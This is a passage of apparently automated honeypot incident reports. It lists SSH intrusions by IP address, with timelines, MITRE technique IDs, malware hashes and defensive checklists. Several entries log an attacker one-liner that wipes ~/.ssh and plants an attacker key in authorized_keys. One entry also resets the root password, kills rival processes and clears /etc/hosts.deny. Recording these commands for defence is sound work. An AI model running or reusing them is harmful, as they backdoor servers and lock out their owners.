|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:37 |
| **Last Seen** | 2026-04-14 08:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:37:23` | `cowrie.session.connect` |
| `2026-04-14 08:37:23` | `cowrie.client.version` |
| `2026-04-14 08:37:23` | `cowrie.client.kex` |
| `2026-04-14 08:37:25` | `cowrie.login.success` |
| `2026-04-14 08:37:26` | `cowrie.session.params` |
| `2026-04-14 08:37:26` | `cowrie.command.input` |
| `2026-04-14 08:37:26` | `cowrie.command.failed` |
| `2026-04-14 08:37:26` | `cowrie.log.closed` |
| `2026-04-14 08:37:26` | `cowrie.session.params` |
| `2026-04-14 08:37:26` | `cowrie.command.input` |
| `2026-04-14 08:37:26` | `cowrie.session.file_download` |
| `2026-04-14 08:37:26` | `cowrie.log.closed` |
| `2026-04-14 08:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ed15b379596

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:37 |
| **Last Seen** | 2026-04-14 08:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:37:30` | `cowrie.session.connect` |
| `2026-04-14 08:37:30` | `cowrie.client.version` |
| `2026-04-14 08:37:30` | `cowrie.client.kex` |
| `2026-04-14 08:37:31` | `cowrie.login.success` |
| `2026-04-14 08:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73db9b9d5a05

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:37 |
| **Last Seen** | 2026-04-14 08:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:37:59` | `cowrie.session.connect` |
| `2026-04-14 08:37:59` | `cowrie.client.version` |
| `2026-04-14 08:37:59` | `cowrie.client.kex` |
| `2026-04-14 08:38:00` | `cowrie.login.success` |
| `2026-04-14 08:38:01` | `cowrie.session.params` |
| `2026-04-14 08:38:01` | `cowrie.command.input` |
| `2026-04-14 08:38:01` | `cowrie.command.failed` |
| `2026-04-14 08:38:01` | `cowrie.log.closed` |
| `2026-04-14 08:38:01` | `cowrie.session.params` |
| `2026-04-14 08:38:01` | `cowrie.command.input` |
| `2026-04-14 08:38:02` | `cowrie.session.file_download` |
| `2026-04-14 08:38:02` | `cowrie.log.closed` |
| `2026-04-14 08:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-662b001886b9

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:38 |
| **Last Seen** | 2026-04-14 08:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:38:04` | `cowrie.session.connect` |
| `2026-04-14 08:38:04` | `cowrie.client.version` |
| `2026-04-14 08:38:04` | `cowrie.client.kex` |
| `2026-04-14 08:38:05` | `cowrie.login.success` |
| `2026-04-14 08:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec36b58eeb5a

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:38 |
| **Last Seen** | 2026-04-14 08:43 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:1iJzho9qjsGp"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:38:56` | `cowrie.session.connect` |
| `2026-04-14 08:38:56` | `cowrie.client.version` |
| `2026-04-14 08:38:56` | `cowrie.client.kex` |
| `2026-04-14 08:38:56` | `cowrie.login.success` |
| `2026-04-14 08:38:57` | `cowrie.session.params` |
| `2026-04-14 08:38:57` | `cowrie.command.input` |
| `2026-04-14 08:38:57` | `cowrie.command.failed` |
| `2026-04-14 08:38:58` | `cowrie.log.closed` |
| `2026-04-14 08:38:58` | `cowrie.session.params` |
| `2026-04-14 08:38:58` | `cowrie.command.input` |
| `2026-04-14 08:38:58` | `cowrie.session.file_download` |
| `2026-04-14 08:38:58` | `cowrie.log.closed` |
| `2026-04-14 08:39:12` | `cowrie.session.params` |
| `2026-04-14 08:39:12` | `cowrie.command.input` |
| `2026-04-14 08:39:12` | `cowrie.log.closed` |
| `2026-04-14 08:39:12` | `cowrie.session.params` |
| `2026-04-14 08:39:12` | `cowrie.command.input` |
| `2026-04-14 08:39:12` | `cowrie.log.closed` |
| `2026-04-14 08:39:13` | `cowrie.session.params` |
| `2026-04-14 08:39:13` | `cowrie.command.input` |
| `2026-04-14 08:39:13` | `cowrie.session.file_download` |
| `2026-04-14 08:39:13` | `cowrie.log.closed` |
| `2026-04-14 08:39:13` | `cowrie.session.params` |
| `2026-04-14 08:39:13` | `cowrie.command.input` |
| `2026-04-14 08:39:13` | `cowrie.log.closed` |
| `2026-04-14 08:39:14` | `cowrie.session.params` |
| `2026-04-14 08:39:14` | `cowrie.command.input` |
| `2026-04-14 08:39:14` | `cowrie.log.closed` |
| `2026-04-14 08:39:14` | `cowrie.session.params` |
| `2026-04-14 08:39:14` | `cowrie.command.input` |
| `2026-04-14 08:39:14` | `cowrie.command.input` |
| `2026-04-14 08:39:14` | `cowrie.log.closed` |
| `2026-04-14 08:39:15` | `cowrie.session.params` |
| `2026-04-14 08:39:15` | `cowrie.command.input` |
| `2026-04-14 08:39:15` | `cowrie.log.closed` |
| `2026-04-14 08:39:15` | `cowrie.session.params` |
| `2026-04-14 08:39:15` | `cowrie.command.input` |
| `2026-04-14 08:39:15` | `cowrie.log.closed` |
| `2026-04-14 08:39:15` | `cowrie.session.params` |
| `2026-04-14 08:39:15` | `cowrie.command.input` |
| `2026-04-14 08:39:16` | `cowrie.log.closed` |
| `2026-04-14 08:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1846e1dec6a0

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:39 |
| **Last Seen** | 2026-04-14 08:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:39:32` | `cowrie.session.connect` |
| `2026-04-14 08:39:32` | `cowrie.client.version` |
| `2026-04-14 08:39:33` | `cowrie.client.kex` |
| `2026-04-14 08:39:33` | `cowrie.login.success` |
| `2026-04-14 08:39:34` | `cowrie.session.params` |
| `2026-04-14 08:39:34` | `cowrie.command.input` |
| `2026-04-14 08:39:34` | `cowrie.command.failed` |
| `2026-04-14 08:39:34` | `cowrie.log.closed` |
| `2026-04-14 08:39:35` | `cowrie.session.params` |
| `2026-04-14 08:39:35` | `cowrie.command.input` |
| `2026-04-14 08:39:35` | `cowrie.session.file_download` |
| `2026-04-14 08:39:35` | `cowrie.log.closed` |
| `2026-04-14 08:39:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ebeddf4eb2f

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:39 |
| **Last Seen** | 2026-04-14 08:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:39:38` | `cowrie.session.connect` |
| `2026-04-14 08:39:38` | `cowrie.client.version` |
| `2026-04-14 08:39:38` | `cowrie.client.kex` |
| `2026-04-14 08:39:39` | `cowrie.login.success` |
| `2026-04-14 08:39:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-254a08d1ce3b

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:41 |
| **Last Seen** | 2026-04-14 08:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:41:30` | `cowrie.session.connect` |
| `2026-04-14 08:41:30` | `cowrie.client.version` |
| `2026-04-14 08:41:30` | `cowrie.client.kex` |
| `2026-04-14 08:41:30` | `cowrie.login.success` |
| `2026-04-14 08:41:31` | `cowrie.session.params` |
| `2026-04-14 08:41:31` | `cowrie.command.input` |
| `2026-04-14 08:41:31` | `cowrie.command.failed` |
| `2026-04-14 08:41:31` | `cowrie.log.closed` |
| `2026-04-14 08:41:31` | `cowrie.session.params` |
| `2026-04-14 08:41:31` | `cowrie.command.input` |
| `2026-04-14 08:41:31` | `cowrie.session.file_download` |
| `2026-04-14 08:41:31` | `cowrie.log.closed` |
| `2026-04-14 08:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cebbc14cdd0

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:41 |
| **Last Seen** | 2026-04-14 08:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:41:33` | `cowrie.session.connect` |
| `2026-04-14 08:41:33` | `cowrie.client.version` |
| `2026-04-14 08:41:33` | `cowrie.client.kex` |
| `2026-04-14 08:41:34` | `cowrie.login.success` |
| `2026-04-14 08:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aba0d7bdda3

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:42 |
| **Last Seen** | 2026-04-14 08:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:42:28` | `cowrie.session.connect` |
| `2026-04-14 08:42:28` | `cowrie.client.version` |
| `2026-04-14 08:42:29` | `cowrie.client.kex` |
| `2026-04-14 08:42:29` | `cowrie.login.success` |
| `2026-04-14 08:42:30` | `cowrie.session.params` |
| `2026-04-14 08:42:30` | `cowrie.command.input` |
| `2026-04-14 08:42:30` | `cowrie.command.failed` |
| `2026-04-14 08:42:30` | `cowrie.log.closed` |
| `2026-04-14 08:42:31` | `cowrie.session.params` |
| `2026-04-14 08:42:31` | `cowrie.command.input` |
| `2026-04-14 08:42:31` | `cowrie.session.file_download` |
| `2026-04-14 08:42:31` | `cowrie.log.closed` |
| `2026-04-14 08:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1697cf8d6818

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:42 |
| **Last Seen** | 2026-04-14 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:42:33` | `cowrie.session.connect` |
| `2026-04-14 08:42:34` | `cowrie.client.version` |
| `2026-04-14 08:42:34` | `cowrie.client.kex` |
| `2026-04-14 08:42:35` | `cowrie.login.success` |
| `2026-04-14 08:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a233a5953a5f

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:43 |
| **Last Seen** | 2026-04-14 08:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:43:02` | `cowrie.session.connect` |
| `2026-04-14 08:43:02` | `cowrie.client.version` |
| `2026-04-14 08:43:02` | `cowrie.client.kex` |
| `2026-04-14 08:43:03` | `cowrie.login.success` |
| `2026-04-14 08:43:03` | `cowrie.session.params` |
| `2026-04-14 08:43:03` | `cowrie.command.input` |
| `2026-04-14 08:43:03` | `cowrie.command.failed` |
| `2026-04-14 08:43:03` | `cowrie.log.closed` |
| `2026-04-14 08:43:03` | `cowrie.session.params` |
| `2026-04-14 08:43:03` | `cowrie.command.input` |
| `2026-04-14 08:43:04` | `cowrie.session.file_download` |
| `2026-04-14 08:43:04` | `cowrie.log.closed` |
| `2026-04-14 08:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2de1bd328681

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:43 |
| **Last Seen** | 2026-04-14 08:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:43:06` | `cowrie.session.connect` |
| `2026-04-14 08:43:06` | `cowrie.client.version` |
| `2026-04-14 08:43:06` | `cowrie.client.kex` |
| `2026-04-14 08:43:06` | `cowrie.login.success` |
| `2026-04-14 08:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-072a1529a4a3

| Field | Detail |
|---|---|
| **Source IP** | `185.213.175[.]140` |
| **First Seen** | 2026-04-14 08:45 |
| **Last Seen** | 2026-04-14 08:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:45:09` | `cowrie.session.connect` |
| `2026-04-14 08:45:09` | `cowrie.client.version` |
| `2026-04-14 08:45:10` | `cowrie.client.kex` |
| `2026-04-14 08:45:10` | `cowrie.login.success` |
| `2026-04-14 08:45:10` | `cowrie.session.params` |
| `2026-04-14 08:45:10` | `cowrie.command.input` |
| `2026-04-14 08:45:10` | `cowrie.command.failed` |
| `2026-04-14 08:45:11` | `cowrie.log.closed` |
| `2026-04-14 08:45:11` | `cowrie.session.params` |
| `2026-04-14 08:45:11` | `cowrie.command.input` |
| `2026-04-14 08:45:11` | `cowrie.session.file_download` |
| `2026-04-14 08:45:11` | `cowrie.log.closed` |
| `2026-04-14 08:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.213.175[.]140` to AbuseIPDB if not already reported
- [ ] Block `185.213.175[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e0890699dcb

| Field | Detail |
|---|---|
| **Source IP** | `185.213.175[.]140` |
| **First Seen** | 2026-04-14 08:45 |
| **Last Seen** | 2026-04-14 08:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:45:13` | `cowrie.session.connect` |
| `2026-04-14 08:45:13` | `cowrie.client.version` |
| `2026-04-14 08:45:13` | `cowrie.client.kex` |
| `2026-04-14 08:45:14` | `cowrie.login.success` |
| `2026-04-14 08:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.213.175[.]140` to AbuseIPDB if not already reported
- [ ] Block `185.213.175[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e82497dcd4c

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:45 |
| **Last Seen** | 2026-04-14 08:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
